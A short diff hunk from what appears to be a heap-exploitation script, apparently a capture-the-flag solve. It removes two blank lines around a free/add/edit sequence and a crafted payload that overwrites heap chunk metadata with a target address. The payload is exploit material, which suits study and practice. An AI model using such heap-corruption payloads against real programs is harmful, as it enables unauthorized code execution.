@@ -45,8 +45,6 @@ log.warning(hex(base))
 free("X")
 add("N",0x28)
 
-
-
 pay = p64(0)*10+"n132\0\0\0\0"+p64(0)*9+p64(0x000000000603080)+p64(0x30)
 edit("B",pay)
 
